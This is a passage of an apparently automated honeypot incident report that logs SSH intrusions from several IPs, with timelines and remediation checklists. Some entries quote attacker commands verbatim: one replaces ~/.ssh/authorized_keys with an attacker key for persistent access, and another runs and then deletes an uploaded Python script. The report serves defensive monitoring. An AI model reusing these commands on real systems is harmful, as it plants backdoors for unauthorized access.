| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:07:53` | `cowrie.session.connect` |
| `2026-07-02 19:07:53` | `cowrie.client.version` |
| `2026-07-02 19:07:54` | `cowrie.client.kex` |
| `2026-07-02 19:07:54` | `cowrie.login.success` |
| `2026-07-02 19:07:55` | `cowrie.session.params` |
| `2026-07-02 19:07:55` | `cowrie.command.input` |
| `2026-07-02 19:07:55` | `cowrie.command.failed` |
| `2026-07-02 19:07:55` | `cowrie.log.closed` |
| `2026-07-02 19:07:56` | `cowrie.session.params` |
| `2026-07-02 19:07:56` | `cowrie.command.input` |
| `2026-07-02 19:07:56` | `cowrie.session.file_download` |
| `2026-07-02 19:07:56` | `cowrie.log.closed` |
| `2026-07-02 19:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-318354625068

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-07-02 19:07 |
| **Last Seen** | 2026-07-02 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:07:56` | `cowrie.session.connect` |
| `2026-07-02 19:07:56` | `cowrie.client.version` |
| `2026-07-02 19:07:56` | `cowrie.client.kex` |
| `2026-07-02 19:07:56` | `cowrie.login.success` |
| `2026-07-02 19:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02ef6e22b96e

| Field | Detail |
|---|---|
| **Source IP** | `109.91.4[.]177` |
| **First Seen** | 2026-07-02 19:07 |
| **Last Seen** | 2026-07-02 19:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:07:57` | `cowrie.session.connect` |
| `2026-07-02 19:07:57` | `cowrie.client.version` |
| `2026-07-02 19:07:57` | `cowrie.client.kex` |
| `2026-07-02 19:07:57` | `cowrie.login.success` |
| `2026-07-02 19:07:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.91.4[.]177` to AbuseIPDB if not already reported
- [ ] Block `109.91.4[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73e58f6cc498

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 19:09 |
| **Last Seen** | 2026-07-02 19:09 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:09:11` | `cowrie.session.connect` |
| `2026-07-02 19:09:12` | `cowrie.client.version` |
| `2026-07-02 19:09:12` | `cowrie.client.kex` |
| `2026-07-02 19:09:18` | `cowrie.login.success` |
| `2026-07-02 19:09:21` | `cowrie.session.params` |
| `2026-07-02 19:09:21` | `cowrie.command.input` |
| `2026-07-02 19:09:24` | `cowrie.log.closed` |
| `2026-07-02 19:09:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9eb23067b9a0

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-02 19:10 |
| **Last Seen** | 2026-07-02 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:10:54` | `cowrie.session.connect` |
| `2026-07-02 19:10:54` | `cowrie.client.version` |
| `2026-07-02 19:10:54` | `cowrie.client.kex` |
| `2026-07-02 19:10:54` | `cowrie.login.success` |
| `2026-07-02 19:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10a37cff399

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-02 19:10 |
| **Last Seen** | 2026-07-02 19:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:10:54` | `cowrie.session.connect` |
| `2026-07-02 19:10:54` | `cowrie.client.version` |
| `2026-07-02 19:10:54` | `cowrie.client.kex` |
| `2026-07-02 19:10:54` | `cowrie.login.success` |
| `2026-07-02 19:10:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3cfbef22bba

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-02 19:11 |
| **Last Seen** | 2026-07-02 19:13 |
| **Session Duration** | 128s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:11:16` | `cowrie.session.connect` |
| `2026-07-02 19:11:16` | `cowrie.client.version` |
| `2026-07-02 19:11:16` | `cowrie.client.kex` |
| `2026-07-02 19:11:16` | `cowrie.login.success` |
| `2026-07-02 19:11:17` | `cowrie.session.file_upload` |
| `2026-07-02 19:11:18` | `cowrie.session.params` |
| `2026-07-02 19:11:18` | `cowrie.command.input` |
| `2026-07-02 19:11:18` | `cowrie.command.input` |
| `2026-07-02 19:11:18` | `cowrie.command.input` |
| `2026-07-02 19:11:18` | `cowrie.command.failed` |
| `2026-07-02 19:11:18` | `cowrie.log.closed` |
| `2026-07-02 19:11:19` | `cowrie.session.params` |
| `2026-07-02 19:11:19` | `cowrie.command.input` |
| `2026-07-02 19:11:19` | `cowrie.log.closed` |
| `2026-07-02 19:11:20` | `cowrie.session.params` |
| `2026-07-02 19:11:20` | `cowrie.command.input` |
| `2026-07-02 19:11:20` | `cowrie.log.closed` |
| `2026-07-02 19:11:20` | `cowrie.session.params` |
| `2026-07-02 19:11:20` | `cowrie.command.input` |
| `2026-07-02 19:11:20` | `cowrie.command.failed` |
| `2026-07-02 19:11:20` | `cowrie.command.failed` |
| `2026-07-02 19:12:21` | `cowrie.session.params` |
| `2026-07-02 19:12:21` | `cowrie.command.input` |
| `2026-07-02 19:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f1b97a154a4

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-07-02 19:13 |
| **Last Seen** | 2026-07-02 19:15 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:13:39` | `cowrie.session.connect` |
| `2026-07-02 19:13:39` | `cowrie.client.version` |
| `2026-07-02 19:13:39` | `cowrie.client.kex` |
| `2026-07-02 19:13:40` | `cowrie.login.success` |
| `2026-07-02 19:13:40` | `cowrie.session.file_upload` |
| `2026-07-02 19:13:41` | `cowrie.session.params` |
| `2026-07-02 19:13:41` | `cowrie.command.input` |
| `2026-07-02 19:13:41` | `cowrie.command.input` |
| `2026-07-02 19:13:41` | `cowrie.command.input` |
| `2026-07-02 19:13:41` | `cowrie.command.failed` |
| `2026-07-02 19:13:41` | `cowrie.log.closed` |
| `2026-07-02 19:13:42` | `cowrie.session.params` |
| `2026-07-02 19:13:42` | `cowrie.command.input` |
| `2026-07-02 19:13:42` | `cowrie.log.closed` |
| `2026-07-02 19:13:43` | `cowrie.session.params` |
| `2026-07-02 19:13:43` | `cowrie.command.input` |
| `2026-07-02 19:13:43` | `cowrie.log.closed` |
| `2026-07-02 19:13:44` | `cowrie.session.params` |
| `2026-07-02 19:13:44` | `cowrie.command.input` |
| `2026-07-02 19:13:44` | `cowrie.command.failed` |
| `2026-07-02 19:13:44` | `cowrie.command.failed` |
| `2026-07-02 19:14:45` | `cowrie.session.params` |
| `2026-07-02 19:14:45` | `cowrie.command.input` |
| `2026-07-02 19:15:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddd696e8da1b

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-02 19:15 |
| **Last Seen** | 2026-07-02 19:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:15:38` | `cowrie.session.connect` |
| `2026-07-02 19:15:38` | `cowrie.client.version` |
| `2026-07-02 19:15:38` | `cowrie.client.kex` |
| `2026-07-02 19:15:40` | `cowrie.login.success` |
| `2026-07-02 19:15:41` | `cowrie.session.params` |
| `2026-07-02 19:15:41` | `cowrie.command.input` |
| `2026-07-02 19:15:42` | `cowrie.log.closed` |
| `2026-07-02 19:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51f1bffba6e4

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-02 19:17 |
| **Last Seen** | 2026-07-02 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:17:31` | `cowrie.session.connect` |
| `2026-07-02 19:17:31` | `cowrie.client.version` |
| `2026-07-02 19:17:31` | `cowrie.client.kex` |
| `2026-07-02 19:17:31` | `cowrie.login.success` |
| `2026-07-02 19:17:31` | `cowrie.direct-tcpip.request` |
| `2026-07-02 19:17:31` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-02 19:17:31` | `cowrie.direct-tcpip.data` |
| `2026-07-02 19:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15a7193a947a

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]121` |
| **First Seen** | 2026-07-02 19:17 |
| **Last Seen** | 2026-07-02 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:17:31` | `cowrie.session.connect` |
| `2026-07-02 19:17:31` | `cowrie.client.version` |
| `2026-07-02 19:17:32` | `cowrie.client.kex` |
| `2026-07-02 19:17:32` | `cowrie.login.success` |
| `2026-07-02 19:17:32` | `cowrie.direct-tcpip.request` |
| `2026-07-02 19:17:32` | `cowrie.direct-tcpip.ja4h` |
| `2026-07-02 19:17:32` | `cowrie.direct-tcpip.data` |
| `2026-07-02 19:17:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]121` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]121` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd971e5736a9

| Field | Detail |
|---|---|
| **Source IP** | `51.75.247[.]232` |
| **First Seen** | 2026-07-02 19:17 |
| **Last Seen** | 2026-07-02 19:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:17:34` | `cowrie.session.connect` |
| `2026-07-02 19:17:34` | `cowrie.client.version` |
| `2026-07-02 19:17:34` | `cowrie.client.kex` |
| `2026-07-02 19:17:34` | `cowrie.login.success` |
| `2026-07-02 19:17:35` | `cowrie.session.params` |
| `2026-07-02 19:17:35` | `cowrie.command.input` |
| `2026-07-02 19:17:35` | `cowrie.command.failed` |
| `2026-07-02 19:17:35` | `cowrie.log.closed` |
| `2026-07-02 19:17:36` | `cowrie.session.params` |
| `2026-07-02 19:17:36` | `cowrie.command.input` |
| `2026-07-02 19:17:36` | `cowrie.session.file_download` |
| `2026-07-02 19:17:36` | `cowrie.log.closed` |
| `2026-07-02 19:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.247[.]232` to AbuseIPDB if not already reported
- [ ] Block `51.75.247[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e206e208519

| Field | Detail |
|---|---|
| **Source IP** | `51.75.247[.]232` |
| **First Seen** | 2026-07-02 19:17 |
| **Last Seen** | 2026-07-02 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:17:36` | `cowrie.session.connect` |
| `2026-07-02 19:17:36` | `cowrie.client.version` |
| `2026-07-02 19:17:36` | `cowrie.client.kex` |
| `2026-07-02 19:17:36` | `cowrie.login.success` |
| `2026-07-02 19:17:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.247[.]232` to AbuseIPDB if not already reported
- [ ] Block `51.75.247[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98dc674abdcb

| Field | Detail |
|---|---|
| **Source IP** | `51.75.247[.]232` |
| **First Seen** | 2026-07-02 19:17 |
| **Last Seen** | 2026-07-02 19:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:17:36` | `cowrie.session.connect` |
| `2026-07-02 19:17:36` | `cowrie.client.version` |
| `2026-07-02 19:17:37` | `cowrie.client.kex` |
| `2026-07-02 19:17:37` | `cowrie.login.success` |
| `2026-07-02 19:17:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `51.75.247[.]232` to AbuseIPDB if not already reported
- [ ] Block `51.75.247[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa8c5afa831

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]57` |
| **First Seen** | 2026-07-02 19:18 |
| **Last Seen** | 2026-07-02 19:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:18:12` | `cowrie.session.connect` |
| `2026-07-02 19:18:13` | `cowrie.login.success` |
| `2026-07-02 19:18:13` | `cowrie.session.params` |
| `2026-07-02 19:18:14` | `cowrie.command.input` |
| `2026-07-02 19:18:14` | `cowrie.command.input` |
| `2026-07-02 19:18:15` | `cowrie.command.input` |
| `2026-07-02 19:18:16` | `cowrie.command.input` |
| `2026-07-02 19:18:16` | `cowrie.command.failed` |
| `2026-07-02 19:18:16` | `cowrie.log.closed` |
| `2026-07-02 19:18:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]57` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]57` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b83c751fa96e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-02 19:20 |
| **Last Seen** | 2026-07-02 19:21 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:20:53` | `cowrie.session.connect` |
| `2026-07-02 19:20:56` | `cowrie.client.version` |
| `2026-07-02 19:20:56` | `cowrie.client.kex` |
| `2026-07-02 19:21:01` | `cowrie.login.success` |
| `2026-07-02 19:21:06` | `cowrie.session.params` |
| `2026-07-02 19:21:06` | `cowrie.command.input` |
| `2026-07-02 19:21:07` | `cowrie.log.closed` |
| `2026-07-02 19:21:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b85ff9800c49

| Field | Detail |
|---|---|
| **Source IP** | `106.52.169[.]134` |
| **First Seen** | 2026-07-02 19:25 |
| **Last Seen** | 2026-07-02 19:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:25:52` | `cowrie.session.connect` |
| `2026-07-02 19:25:52` | `cowrie.client.version` |
| `2026-07-02 19:25:53` | `cowrie.client.kex` |
| `2026-07-02 19:25:53` | `cowrie.login.success` |
| `2026-07-02 19:25:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.52.169[.]134` to AbuseIPDB if not already reported
- [ ] Block `106.52.169[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-005ba57b3e88

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:26 |
| **Last Seen** | 2026-07-02 19:27 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:26:24` | `cowrie.session.connect` |
| `2026-07-02 19:26:29` | `cowrie.client.version` |
| `2026-07-02 19:26:29` | `cowrie.client.kex` |
| `2026-07-02 19:26:53` | `cowrie.login.success` |
| `2026-07-02 19:27:05` | `cowrie.session.params` |
| `2026-07-02 19:27:05` | `cowrie.command.input` |
| `2026-07-02 19:27:11` | `cowrie.log.closed` |
| `2026-07-02 19:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8de90d8a7930

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 19:26 |
| **Last Seen** | 2026-07-02 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:26:51` | `cowrie.session.connect` |
| `2026-07-02 19:26:51` | `cowrie.client.version` |
| `2026-07-02 19:26:51` | `cowrie.client.kex` |
| `2026-07-02 19:26:51` | `cowrie.login.success` |
| `2026-07-02 19:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-092e557acd56

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 19:26 |
| **Last Seen** | 2026-07-02 19:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:26:51` | `cowrie.session.connect` |
| `2026-07-02 19:26:51` | `cowrie.client.version` |
| `2026-07-02 19:26:51` | `cowrie.client.kex` |
| `2026-07-02 19:26:51` | `cowrie.login.success` |
| `2026-07-02 19:26:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a423933d1c1

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 19:26 |
| **Last Seen** | 2026-07-02 19:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:26:59` | `cowrie.session.connect` |
| `2026-07-02 19:26:59` | `cowrie.client.version` |
| `2026-07-02 19:26:59` | `cowrie.client.kex` |
| `2026-07-02 19:26:59` | `cowrie.login.success` |
| `2026-07-02 19:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-187915df67ef

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-02 19:26 |
| **Last Seen** | 2026-07-02 19:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:26:59` | `cowrie.session.connect` |
| `2026-07-02 19:26:59` | `cowrie.client.version` |
| `2026-07-02 19:26:59` | `cowrie.client.kex` |
| `2026-07-02 19:26:59` | `cowrie.login.success` |
| `2026-07-02 19:27:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18713908b2e0

| Field | Detail |
|---|---|
| **Source IP** | `139.99.74[.]35` |
| **First Seen** | 2026-07-02 19:27 |
| **Last Seen** | 2026-07-02 19:28 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a && echo "====" && cat /etc/os-release` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-02 19:27:18` | `cowrie.session.connect` |
| `2026-07-02 19:27:23` | `cowrie.client.version` |
| `2026-07-02 19:27:23` | `cowrie.client.kex` |
| `2026-07-02 19:27:45` | `cowrie.login.success` |
| `2026-07-02 19:27:58` | `cowrie.session.params` |
| `2026-07-02 19:27:58` | `cowrie.command.input` |
| `2026-07-02 19:28:04` | `cowrie.log.closed` |
| `2026-07-02 19:28:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.99.74[.]35` to AbuseIPDB if not already reported
- [ ] Block `139.99.74[.]35` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9ce3b5d0836a

| Field | Detail |
|---|---|
| **Source IP** | `203.200.74[.]18` |
| **First Seen** | 2026-07-02 19:28 |
| **Last Seen** | 2026-07-02 19:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
